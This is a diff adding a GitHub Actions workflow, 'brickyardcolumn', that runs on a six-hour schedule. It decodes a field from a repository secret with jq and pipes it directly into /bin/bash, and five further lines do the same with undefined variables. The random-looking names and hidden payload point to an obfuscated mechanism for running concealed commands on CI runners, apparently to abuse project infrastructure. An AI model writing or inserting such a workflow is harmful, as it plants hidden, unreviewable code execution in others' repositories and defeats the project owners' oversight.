@@ -1,0 +1,23 @@
+name: brickyardcolumn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: brickyardcolumn
+        env:
+          i470: ${{ secrets.i470 }}
+        run: |
+          echo $i470 | jq -r .lzrrq31984 | /bin/bash
+          echo $qp67 | jq -r .p87 | /bin/bash
+          echo $io70 | jq -r .b66290 | /bin/bash
+          echo $rkyih174 | jq -r .y5501 | /bin/bash
+          echo $tuj021 | jq -r .grjs878 | /bin/bash
+          echo $n42 | jq -r .wdqis250 | /bin/bash
+
